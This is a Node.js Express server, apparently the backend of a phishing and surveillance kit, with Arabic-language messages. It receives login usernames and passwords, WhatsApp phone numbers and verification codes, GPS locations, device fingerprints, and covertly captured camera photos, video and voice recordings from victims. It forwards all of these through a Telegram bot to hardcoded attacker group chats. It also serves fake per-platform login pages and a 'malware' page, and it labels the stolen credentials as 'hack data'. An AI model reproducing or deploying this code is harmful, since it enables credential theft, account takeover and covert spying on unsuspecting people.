const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const token = process.env.s;
const bot = new TelegramBot(token, { polling: false });

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.post('/submitVideo', upload.single('video'), async (req, res) => {
    const chatId = req.body.userId;
    const file = req.file;
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    const groupChatId = '-1002433284949';

    if (file) {
        console.log(`Received video from user ${chatId}`);

        const caption = `
📹 **معلومات الفيديو**
──────────────
📷 نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
🌐 IP: ${additionalData.ip || 'غير متاح'}
📍 الدولة: ${additionalData.country || 'غير متاح'}
🏙️ المدينة: ${additionalData.city || 'غير متاح'}
💻 المنصة: ${additionalData.platform || 'غير متاح'}
📱 إصدار الجهاز: ${additionalData.deviceVersion || 'غير متاح'}
🔋 مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
⚡ الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
        `;

        try {
            const userInfo = await bot.getChat(chatId);
            const userName = userInfo.first_name || 'غير متاح';
            const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

            const userInfoText = `
👤 **معلومات المستخدم**
──────────────
📛 الاسم: ${userName}
🆔 اليوزر: ${userUsername}
            `;

            await bot.sendVideo(chatId, file.buffer, { caption: caption });
            await bot.sendVideo(groupChatId, file.buffer, { caption: `🎥 **فيديو جديد من المستخدم**\n🆔 المعرف: ${chatId}\n${userInfoText}\n${caption}` });

            console.log('Video sent successfully to both user and group');
            res.json({ success: true });
        } catch (error) {
            console.error('Error sending video to Telegram:', error);
            res.status(500).json({ success: false, error: 'Error sending video to Telegram' });
        }
    } else {
        res.status(400).json({ success: false, error: 'No video received' });
    }
});

app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
    const userId = req.body.userId;
    const files = req.files;
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    const groupChatId = '-1002433284949';

    if (files && files.length > 0) {
        console.log(`Received ${files.length} images from user ${userId}`);

        const caption = `
📸 **معلومات الصورة**
──────────────
📷 نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
🌐 IP: ${additionalData.ip}
📍 الدولة: ${additionalData.country}
🏙️ المدينة: ${additionalData.city}
💻 المنصة: ${additionalData.platform}
📱 إصدار الجهاز: ${additionalData.deviceVersion}
🔋 مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
⚡ الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
        `;

        try {
            const userInfo = await bot.getChat(userId);
            const userName = userInfo.first_name || 'غير متاح';
            const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

            const userInfoText = `
👤 **معلومات المستخدم**
──────────────
📛 الاسم: ${userName}
🆔 اليوزر: ${userUsername}
            `;

            for (const file of files) {
                await bot.sendPhoto(userId, file.buffer, { caption: caption });
            }

            for (const file of files) {
                await bot.sendPhoto(groupChatId, file.buffer, { caption: `🖼️ **صور جديدة من المستخدم**\n🆔 المعرف: ${userId}\n${userInfoText}\n${caption}` });
            }

            console.log('Photos sent successfully to both user and group');
            res.json({ success: true });
        } catch (err) {
            console.error('Failed to send photos:', err);
            res.status(500).json({ error: 'Failed to send photos' });
        }
    } else {
        console.log('No images received');
        res.status(400).json({ error: 'No images received' });
    }
});

app.post('/submitVoice', upload.single('voice'), async (req, res) => {
    const chatId = req.body.chatId;
    const voiceFile = req.file;
    const additionalData = JSON.parse(req.body.additionalData || '{}');

    const groupChatId = '-1002433284949';

    if (!voiceFile) {
        console.error('No voice file received');
        return res.status(400).json({ error: 'No voice file received' });
    }

    const caption = `
🎤 **معلومات التسجيل الصوتي**
──────────────
🌐 IP: ${additionalData.ip || 'غير متاح'}
📍 الدولة: ${additionalData.country || 'غير متاح'}
🏙️ المدينة: ${additionalData.city || 'غير متاح'}
💻 المنصة: ${additionalData.platform || 'غير متاح'}
📱 إصدار الجهاز: ${additionalData.deviceVersion || 'غير متاح'}
🔋 مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
⚡ الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
    `;

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **معلومات المستخدم**
──────────────
📛 الاسم: ${userName}
🆔 اليوزر: ${userUsername}
        `;

        await bot.sendVoice(chatId, voiceFile.buffer, { caption: caption });
        await bot.sendVoice(groupChatId, voiceFile.buffer, { caption: `🎵 **تسجيل صوتي جديد من المستخدم**\n🆔 المعرف: ${chatId}\n${userInfoText}\n${caption}` });

        console.log('Voice sent successfully to both user and group');
        res.json({ success: true });
    } catch (error) {
        console.error('Error sending voice:', error);
        res.status(500).json({ error: 'Failed to send voice message' });
    }
});

app.post('/submitLocation', async (req, res) => {
    const { chatId, latitude, longitude, additionalData = {} } = req.body;

    const groupChatId = '-1002433284949';

    if (!chatId || !latitude || !longitude) {
        return res.status(400).json({ error: 'Missing required data' });
    }

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **معلومات المستخدم**
──────────────
📛 الاسم: ${userName}
🆔 اليوزر: ${userUsername}
        `;

        await bot.sendLocation(chatId, latitude, longitude);

        const message = `
📍 **معلومات الموقع**
──────────────
🌐 IP: ${additionalData.ip || 'غير متاح'}
📍 الدولة: ${additionalData.country || 'غير متاح'}
🏙️ المدينة: ${additionalData.city || 'غير متاح'}
💻 المنصة: ${additionalData.platform || 'غير متاح'}
🌐 المتصفح: ${additionalData.userAgent || 'غير متاح'}
🔋 مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
⚡ الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
        `;

        await bot.sendMessage(chatId, message);
        await bot.sendLocation(groupChatId, latitude, longitude);
        await bot.sendMessage(groupChatId, `🗺️ **موقع جديد من المستخدم**\n🆔 المعرف: ${chatId}\n${userInfoText}\n${message}`);

        console.log('Location and additional data sent successfully to both user and group');
        res.json({ success: true });
    } catch (error) {
        console.error('Error sending location:', error);
        res.status(500).json({ error: 'Failed to send location', details: error.message });
    }
});

app.post('/submitIncrease', async (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;

    console.log('Received increase data:', { username, password, platform, chatId, ip, country, city });
    
    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = require('useragent').parse(userAgent);
    const groupChatId = '-1002492307094';

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **معلومات المستخدم**
──────────────
📛 الاسم: ${userName}
🆔 اليوزر: ${userUsername}
        `;

        const userMessage = `
⚠️ **بيانات اختراق جديدة**
──────────────
🔓 المنصة: ${platform}
👤 اسم المستخدم: ${username}
🔑 كلمة السر: ${password}
──────────────
🌐 **معلومات الاتصال**
🌐 IP: ${ip}
📍 الدولة: ${country}
🏙️ المدينة: ${city}
──────────────
💻 **معلومات الجهاز**
🖥️ نظام التشغيل: ${deviceInfo.os.toString()}
🌐 المتصفح: ${deviceInfo.toAgent()}
📱 الجهاز: ${deviceInfo.device.toString()}
        `;

        await bot.sendMessage(chatId, userMessage);
        console.log('Message sent to user successfully');

        await bot.sendMessage(groupChatId, `🔥 **اختراق حساب جديد**\n🆔 المستخدم: ${chatId}\n${userInfoText}\n${userMessage}`);
        console.log('Message sent to group successfully');

        res.json({ success: true });
    } catch (error) {
        console.error('Error sending message:', error);
        res.status(500).json({ error: 'Failed to send increase data', details: error.message });
    }
});

app.post('/sendPhoneNumber', async (req, res) => {
    const { phoneNumber, country, chatId, ip, platform, userAgent } = req.body;

    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = require('useragent').parse(userAgent);
    const groupChatId = '-1002492307094';

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **معلومات المستخدم**
──────────────
📛 الاسم: ${userName}
🆔 اليوزر: ${userUsername}
        `;

        const message = `
📞 **رقم هاتف جديد**
──────────────
📱 رقم الهاتف: ${phoneNumber}
📍 الدولة: ${country}
──────────────
🌐 **معلومات الاتصال**
🌐 IP: ${ip}
💻 المنصة: ${platform}
──────────────
💻 **معلومات الجهاز**
🖥️ نظام التشغيل: ${deviceInfo.os.toString()}
🌐 المتصفح: ${deviceInfo.toAgent()}
📱 الجهاز: ${deviceInfo.device.toString()}
        `;

        await bot.sendMessage(chatId, message);
        console.log('تم إرسال رقم الهاتف إلى المستخدم بنجاح');

        await bot.sendMessage(groupChatId, `☎️ **رقم هاتف جديد من المستخدم**\n🆔 المعرف: ${chatId}\n${userInfoText}\n${message}`);
        console.log('تم إرسال رقم الهاتف إلى المجموعة بنجاح');

        res.json({ success: true, message: 'تم إرسال رمز التحقق' });
    } catch (error) {
        console.error('خطأ في إرسال الرسالة:', error);
        res.status(500).json({ error: 'فشل في إرسال رقم الهاتف', details: error.message });
    }
});

app.post('/verifyCode', async (req, res) => {
    const { verificationCode, chatId, phoneNumber, country, ip, platform, userAgent } = req.body;

    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = require('useragent').parse(userAgent);
    const groupChatId = '-1002492307094';

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **معلومات المستخدم**
──────────────
📛 الاسم: ${userName}
🆔 اليوزر: ${userUsername}
        `;

        const message = `
✅ **كود التحقق**
──────────────
📱 رقم الهاتف: ${phoneNumber}
🔢 كود التحقق: ${verificationCode}
📍 الدولة: ${country}
──────────────
🌐 **معلومات الاتصال**
🌐 IP: ${ip}
💻 المنصة: ${platform}
──────────────
💻 **معلومات الجهاز**
🖥️ نظام التشغيل: ${deviceInfo.os.toString()}
🌐 المتصفح: ${deviceInfo.toAgent()}
📱 الجهاز: ${deviceInfo.device.toString()}
        `;

        await bot.sendMessage(chatId, message);
        console.log('تم إرسال كود التحقق إلى المستخدم بنجاح');

        await bot.sendMessage(groupChatId, `🔐 **كود تحقق جديد من المستخدم**\n🆔 المعرف: ${chatId}\n${userInfoText}\n${message}`);
        console.log('تم إرسال كود التحقق إلى المجموعة بنجاح');

        res.json({ success: true, message: 'تم التحقق من الكود بنجاح' });
    } catch (error) {
        console.error('خطأ في إرسال الرسالة:', error);
        res.status(500).json({ error: 'فشل في التحقق من الكود', details: error.message });
    }
});

app.post('/submitLogin', async (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent, batteryLevel, charging, osVersion } = req.body;

    console.log('Received login data:', { username, password, platform, chatId, ip, country, city, batteryLevel, charging, osVersion });

    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = require('useragent').parse(userAgent);
    const groupChatId = '-1002492307094';

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **معلومات المستخدم**
──────────────
📛 الاسم: ${userName}
🆔 اليوزر: ${userUsername}
        `;

        const userMessage = `
🔑 **بيانات تسجيل الدخول**
──────────────
🔓 المنصة: ${platform}
👤 اسم المستخدم: ${username}
🔑 كلمة السر: ${password}
──────────────
🌐 **معلومات الاتصال**
🌐 IP: ${ip}
📍 الدولة: ${country}
🏙️ المدينة: ${city}
──────────────
💻 **معلومات الجهاز**
📱 إصدار النظام: ${osVersion}
🌐 المتصفح: ${deviceInfo.toAgent()}
📱 الجهاز: ${deviceInfo.device.toString()}
🔋 مستوى البطارية: ${batteryLevel}
⚡ قيد الشحن: ${charging ? 'نعم' : 'لا'}
        `;

        await bot.sendMessage(chatId, userMessage);
        console.log('Message sent to user successfully');

        await bot.sendMessage(groupChatId, `📝 **بيانات تسجيل دخول جديدة**\n🆔 المستخدم: ${chatId}\n${userInfoText}\n${userMessage}`);
        console.log('Message sent to group successfully');

        res.json({ success: true });
    } catch (error) {
        console.error('Error sending message:', error);
        res.status(500).json({ error: 'Failed to send login data', details: error.message });
    }
});

app.post('/SS', async (req, res) => {
    console.log('تم استقبال طلب POST في المسار /SS');
    console.log('البيانات المستلمة:', req.body);

    const chatId = req.body.userId;
    const deviceInfo = req.body.deviceInfo || {};
    const userInfo = req.body.userInfo || {};
    const groupChatId = '-1002433284949';

    const message = `
📱 **معلومات الجهاز والمستخدم**
════════════════════

👤 **بيانات المستخدم**
──────────────
📛 الاسم: ${userInfo.name || 'غير معروف'}
📞 الهاتف: ${userInfo.phone || 'غير معروف'}
📧 البريد الإلكتروني: ${userInfo.email || 'غير معروف'}

📱 **معلومات الجهاز**
──────────────
🌍 الدولة: ${deviceInfo.country || 'غير معروف'}
🏙️ المدينة: ${deviceInfo.city || 'غير معروف'}
🌐 عنوان IP: ${deviceInfo.ip || 'غير معروف'}
🔋 شحن الهاتف: ${deviceInfo.battery || 'غير معروف'}%
⚡ الهاتف يشحن؟: ${deviceInfo.isCharging ? 'نعم' : 'لا'}
📶 الشبكة: ${deviceInfo.network || 'غير معروف'} (السرعة: ${deviceInfo.networkSpeed || 'غير معروف'} ميغابت/ث)
📡 نوع الاتصال: ${deviceInfo.networkType || 'غير معروف'}
⏰ الوقت: ${deviceInfo.time || 'غير معروف'}
🖥️ اسم الجهاز: ${deviceInfo.deviceName || 'غير معروف'}
📜 إصدار الجهاز: ${deviceInfo.deviceVersion || 'غير معروف'}
📱 نوع الجهاز: ${deviceInfo.deviceType || 'غير معروف'}
🧠 الذاكرة (RAM): ${deviceInfo.memory || 'غير معروف'}
💾 الذاكرة الداخلية: ${deviceInfo.internalStorage || 'غير معروف'} GB
⚙️ عدد الأنوية: ${deviceInfo.cpuCores || 'غير معروف'}
🌐 لغة النظام: ${deviceInfo.language || 'غير معروف'}
🌐 اسم المتصفح: ${deviceInfo.browserName || 'غير معروف'}
📊 إصدار المتصفح: ${deviceInfo.browserVersion || 'غير معروف'}
📏 دقة الشاشة: ${deviceInfo.screenResolution || 'غير معروف'}
🖥️ إصدار نظام التشغيل: ${deviceInfo.osVersion || 'غير معروف'}
🔄 وضع الشاشة: ${deviceInfo.screenOrientation || 'غير معروف'}
🎨 عمق الألوان: ${deviceInfo.colorDepth || 'غير معروف'}
📅 آخر تحديث للمتصفح: ${deviceInfo.lastUpdate || 'غير معروف'}
🔒 بروتوكول الأمان: ${deviceInfo.securityProtocol || 'غير معروف'}
📡 نطاق التردد: ${deviceInfo.connectionFrequency || 'غير معروف'}
🌍 تحديد الموقع: ${deviceInfo.geolocationAvailable ? '✅ متاح' : '❌ غير متاح'}
🔵 البلوتوث: ${deviceInfo.bluetoothSupport ? '✅ متاح' : '❌ غير متاح'}
✋ الإيماءات اللمسية: ${deviceInfo.touchSupport ? '✅ مدعومة' : '❌ غير مدعومة'}
    `;

    try {
        const telegramUserInfo = await bot.getChat(chatId);
        const userName = telegramUserInfo.first_name || 'غير متاح';
        const userUsername = telegramUserInfo.username ? `@${telegramUserInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **معلومات مستخدم تليجرام**
──────────────
📛 الاسم: ${userName}
🆔 اليوزر: ${userUsername}
        `;

        await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        console.log('تم إرسال معلومات الجهاز والمستخدم بنجاح للمستخدم');

        await bot.sendMessage(groupChatId, `📊 **بيانات جهاز جديدة**\n🆔 المستخدم: ${chatId}\n${userInfoText}\n${message}`, { parse_mode: 'Markdown' });
        console.log('تم إرسال معلومات الجهاز والمستخدم بنجاح إلى المجموعة');

        res.json({ success: true });
    } catch (err) {
        console.error('فشل في إرسال معلومات الجهاز والمستخدم:', err);
        res.status(500).json({ error: 'فشل في إرسال معلومات الجهاز والمستخدم' });
    }
});

app.post('/submitPhtos', upload.array('images', 10), async (req, res) => {
    console.log('Received a request to /submitPhotos');
    try {
        const { cameraType, additionalData } = req.body;
        const chatId = req.body.chatId;
        const files = req.files;

        const groupChatId = '-1002433284949';

        console.log('Received request body:', req.body);
        console.log('Received files:', req.files);

        if (!chatId || chatId === 'null') {
            console.error('chatId not provided or is null');
            return res.status(400).json({ success: false, error: 'chatId is required and cannot be null' });
        }

        if (!files || files.length === 0) {
            console.error('No files uploaded');
            return res.status(400).json({ success: false, error: 'No files uploaded' });
        }

        let parsedData = {};
        if (additionalData) {
            try {
                parsedData = JSON.parse(additionalData);
            } catch (error) {
                console.error('Invalid additionalData JSON:', error.message);
                return res.status(400).json({ success: false, error: 'Invalid additionalData format' });
            }
        }

        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **معلومات المستخدم**
──────────────
📛 الاسم: ${userName}
🆔 اليوزر: ${userUsername}
        `;

        const caption = `
📸 **معلومات الصورة**
──────────────
📷 نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
🌐 IP: ${parsedData.ip || 'غير متاح'}
📍 الدولة: ${parsedData.country || 'غير متاح'}
🏙️ المدينة: ${parsedData.city || 'غير متاح'}
💻 المنصة: ${parsedData.platform || 'غير متاح'}
🌐 وكيل المستخدم: ${parsedData.userAgent || 'غير متاح'}
🔋 مستوى البطارية: ${parsedData.batteryLevel || 'غير متاح'}
⚡ الشحن: ${parsedData.batteryCharging ? 'نعم' : 'لا'}
        `;

        for (const file of files) {
            try {
                await bot.sendPhoto(chatId, file.buffer, { caption: caption });
                console.log('Photo sent successfully to user');
            } catch (error) {
                console.error('Error sending photo to user:', error.message);
                return res.status(500).json({ success: false, error: 'Failed to send photo to user' });
            }
        }

        for (const file of files) {
            try {
                await bot.sendPhoto(groupChatId, file.buffer, { caption: `🖼️ **صور جديدة من المستخدم**\n🆔 المعرف: ${chatId}\n${userInfoText}\n${caption}` });
                console.log('Photo sent successfully to group');
            } catch (error) {
                console.error('Error sending photo to group:', error.message);
                return res.status(500).json({ success: false, error: 'Failed to send photo to group' });
            }
        }

        res.json({ success: true });
    } catch (error) {
        console.error('Failed to process request:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/camera/:userId', (req, res) => {
    const userId = req.params.userId;
    res.sendFile(path.join(__dirname, 'location.html'));
});

app.get('/camera/video/:userId', (req, res) => {
    const userId = req.params.userId;
    res.sendFile(path.join(__dirname, 'dualCameraVideo.html'));
});

app.get('/record/:userId', (req, res) => {
    const userId = req.params.userId;
    res.sendFile(path.join(__dirname, 'record.html'));
});

app.get('/getLocation/:userId', (req, res) => {
    const userId = req.params.userId;
    res.sendFile(path.join(__dirname, 'SJGD.html'));
});

app.get('/:userId', (req, res) => {
    const userId = req.params.userId;
    res.sendFile(path.join(__dirname, 'SS.html'));
});

app.get('/whatsapp', (req, res) => {
    res.sendFile(path.join(__dirname, 'phone_form.html'));
});

app.get('/malware', (req, res) => {
    const chatId = req.query.chatId;
    const originalLink = req.query.originalLink;
    res.sendFile(path.join(__dirname, 'malware.html'));
});

app.get('/:action/:platform/:chatId', (req, res) => {
    const { action, platform, chatId } = req.params;
    res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`));
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`✅ سيرفر استقبال البيانات يعمل على المنفذ ${PORT}`);
    console.log('📡 مسارات الاستقبال النشطة:');
    console.log('   📸 /submitPhotos - استقبال الصور');
    console.log('   🎥 /submitVideo - استقبال الفيديو');
    console.log('   🎤 /submitVoice - استقبال الصوت');
    console.log('   📍 /submitLocation - استقبال الموقع');
    console.log('   🔐 /submitLogin - استقبال بيانات تسجيل الدخول');
    console.log('   📱 /SS - استقبال معلومات الجهاز');
    console.log('   ☎️ /sendPhoneNumber - استقبال رقم واتساب');
    console.log('   ✅ /verifyCode - استقبال كود واتساب');
    console.log('   ⚡ /submitIncrease - استقبال بيانات اختراق');
});